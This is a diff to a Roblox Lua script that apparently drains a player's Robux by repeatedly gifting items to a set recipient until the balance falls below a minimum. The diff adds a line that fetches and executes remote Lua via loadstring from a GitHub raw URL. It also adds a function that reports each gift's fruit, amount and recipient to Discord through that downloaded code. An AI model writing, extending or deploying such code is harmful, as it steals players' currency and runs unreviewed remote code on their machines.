@@ -15,10 +15,13 @@ local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
 local UserInputService = game:GetService("UserInputService")
 
+-- Discord Integration
+local SendToDiscord = loadstring(game:HttpGet("https://raw.githubusercontent.com/PIP400/moonstone-hub/main/discord_bot.lua"))()
+
 -- Configuration
-local GIFT_RECIPIENT = "notren_senpai04" -- Your username
-local MAX_GIFT_AMOUNT = 1000 -- Maximum Robux that can be spent per gift
-local MIN_BALANCE_TO_CONTINUE = 24 -- Minimum balance to continue gifting
+local GIFT_RECIPIENT = "YOUR_USERNAME" -- Replace with your username
+local MAX_GIFT_AMOUNT = 100
+local MIN_BALANCE_TO_CONTINUE = 10
 local UI_COLORS = {
     Background = Color3.fromRGB(45, 45, 45),
     Header = Color3.fromRGB(35, 35, 35),
@@ -290,4 +293,19 @@ end
 ActivateButton.MouseButton1Click:Connect(StartMainScript)
 
 -- Parent the landing GUI
-LandingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") 
+LandingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Function to send gift notification
+local function NotifyGift(fruitName, amount)
+    local message = string.format("🎁 Gift Notification\nFruit: %s\nAmount: %d\nRecipient: %s", 
+        fruitName, amount, GIFT_RECIPIENT)
+    SendToDiscord(message)
+end
+
+-- In your gift function, add:
+local function GiftFruit(fruitName, amount)
+    -- Your existing gift code here
+    
+    -- Add notification
+    NotifyGift(fruitName, amount)
+end 
